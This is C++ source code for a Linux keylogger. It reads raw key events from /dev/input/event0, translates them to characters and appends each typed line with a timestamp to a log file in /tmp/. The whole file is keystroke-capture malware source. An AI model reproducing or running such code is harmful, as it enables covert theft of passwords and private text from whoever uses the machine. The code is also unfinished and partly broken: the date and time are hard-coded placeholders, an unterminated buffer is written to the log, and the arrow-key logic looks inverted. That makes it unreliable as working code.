#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>

#include <linux/input.h>

#define LOGS_DIRECTORY  "/tmp/"

struct keylogger_ctx {
    bool is_capslock_on;
    std::string kb_file;
    std::vector<char> kb_buffer;
    int buffer_cursor;
    char current_key;
};

struct key_event_handler {
    char key_char;
    void (*cb)(struct keylogger_ctx *);
};

void handle_key(struct keylogger_ctx *);
void handle_enter(struct keylogger_ctx *);
void handle_backspace(struct keylogger_ctx *);
void handle_capslock(struct keylogger_ctx *);

static const std::map<int, struct key_event_handler> handlers{
    { KEY_0, { '0', handle_key } },
    { KEY_1, { '1', handle_key } },
    { KEY_2, { '2', handle_key } },
    { KEY_3, { '3', handle_key } },
    { KEY_4, { '4', handle_key } },
    { KEY_5, { '5', handle_key } },
    { KEY_6, { '6', handle_key } },
    { KEY_7, { '7', handle_key } },
    { KEY_8, { '8', handle_key } },
    { KEY_9, { '9', handle_key } },
    { KEY_A, { 'a', handle_key } },
    { KEY_B, { 'b', handle_key } },
    { KEY_C, { 'c', handle_key } },
    { KEY_D, { 'd', handle_key } },
    { KEY_E, { 'e', handle_key } },
    { KEY_F, { 'f', handle_key } },
    { KEY_G, { 'g', handle_key } },
    { KEY_H, { 'h', handle_key } },
    { KEY_I, { 'i', handle_key } },
    { KEY_J, { 'j', handle_key } },
    { KEY_K, { 'k', handle_key } },
    { KEY_L, { 'l', handle_key } },
    { KEY_M, { 'm', handle_key } },
    { KEY_N, { 'n', handle_key } },
    { KEY_O, { 'o', handle_key } },
    { KEY_P, { 'p', handle_key } },
    { KEY_Q, { 'q', handle_key } },
    { KEY_R, { 'r', handle_key } },
    { KEY_S, { 's', handle_key } },
    { KEY_T, { 't', handle_key } },
    { KEY_U, { 'u', handle_key } },
    { KEY_V, { 'v', handle_key } },
    { KEY_W, { 'w', handle_key } },
    { KEY_X, { 'x', handle_key } },
    { KEY_Y, { 'y', handle_key } },
    { KEY_Z, { 'z', handle_key } },
    { KEY_SPACE, { ' ', handle_key } },
    { KEY_ENTER, { '\0', handle_enter } },
    { KEY_BACKSPACE, {'\0', handle_backspace } },
    { KEY_CAPSLOCK, {'\0', handle_capslock } }
    //{ KEY_C, 'c' }, { KEY_D, 'd' }, { KEY_E, 'e' }, { KEY_F, 'f' },
    //{ KEY_G, 'g' }, { KEY_H, 'h' }, { KEY_I, 'j' }, { KEY_K, 'k' },
    //{ KEY_L, 'l' }, { KEY_M, 'm' }, { KEY_N, 'n' }, { KEY_O, 'o' },
    //{ KEY_P, 'p' }, { KEY_Q, 'q' }, { KEY_R, 'r' }, { KEY_S, 's' },
    //{ KEY_T, 't' }, { KEY_U, 'u' }, { KEY_V, 'v' }, { KEY_W, 'w' },
    //{ KEY_X, 'x' }, { KEY_Y, 'y' }, { KEY_Z, 'z' }, { KEY_COMMA, ',' },
    //{ KEY_DOT, '.' }, { KEY_MINUS, '-' }, { KEY_SPACE, ' ' }, { KEY_SEMICOLON, ';' },
    //{ KEY_EQUAL, '=' }
};

/*
 *
#define KEY_BACKSPACE		14
#define KEY_TAB			15
#define KEY_LEFTBRACE		26
#define KEY_RIGHTBRACE		27
#define KEY_ENTER		28
#define KEY_LEFTCTRL		29
#define KEY_APOSTROPHE		40
#define KEY_GRAVE		41
#define KEY_LEFTSHIFT		42
#define KEY_BACKSLASH		43
#define KEY_SLASH		53
#define KEY_RIGHTSHIFT		54
#define KEY_KPASTERISK		55
#define KEY_LEFTALT		56
#define KEY_CAPSLOCK		58
*/

void handle_key(struct keylogger_ctx *ctx)
{
    auto key_char = handlers.at(ctx->current_key).key_char;

    if (ctx->is_capslock_on) {
        key_char -= 32;
    }

    ctx->kb_buffer.emplace_back(key_char);
    ctx->buffer_cursor++;

    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_enter(struct keylogger_ctx *ctx)
{
    std::string date{"24_01_21"}; // TODO
    std::ofstream log_file{std::string{LOGS_DIRECTORY} + "log_" + date, std::ios::app};
    std::string timestamp{"18:57:02"}; // TODO

    log_file << "[" << timestamp << "] "
             << ctx->kb_buffer.data() << "\n";

    ctx->kb_buffer.clear();
    ctx->buffer_cursor = 0;
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_capslock(struct keylogger_ctx *ctx)
{
    ctx->is_capslock_on = !ctx->is_capslock_on;
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_delete(struct keylogger_ctx *ctx)
{
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_backspace(struct keylogger_ctx *ctx)
{
    ctx->kb_buffer.erase(ctx->kb_buffer.begin() + (ctx->buffer_cursor - 1));
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

void handle_arrow(struct keylogger_ctx *ctx)
{
    ctx->buffer_cursor = (ctx->current_key == KEY_RIGHT)
        ? (ctx->buffer_cursor - 1)
        : (ctx->buffer_cursor + 1);
    std::cout << __FUNCTION__ << ":" << __LINE__ << std::endl;
}

int main(int argc, char *argv[])
{
    struct input_event ev;
    struct keylogger_ctx ctx = {
        .is_capslock_on = false,
        .kb_file = "/dev/input/event0", // TODO: is this correct?
        .buffer_cursor = 0
    };

    {
        std::ifstream kb_file{ctx.kb_file};

        while (1) {
            kb_file.read((char *)&ev, sizeof(struct input_event));

            // TODO: backspace
            // TODO: delete
            // TODO: tab
            // TODO: cursors
            // TODO: capslock
            if (ev.type == EV_KEY && ev.value) {
                try {
                    auto ev_handler = handlers.at(ev.code);

                    ctx.current_key = ev.code;
                    ev_handler.cb(&ctx);
                } catch(...) {
                    std::cout << "no event handler for key " << ev.code << std::endl;
                }
            }
        }
    }

    std::exit(EXIT_SUCCESS);
}
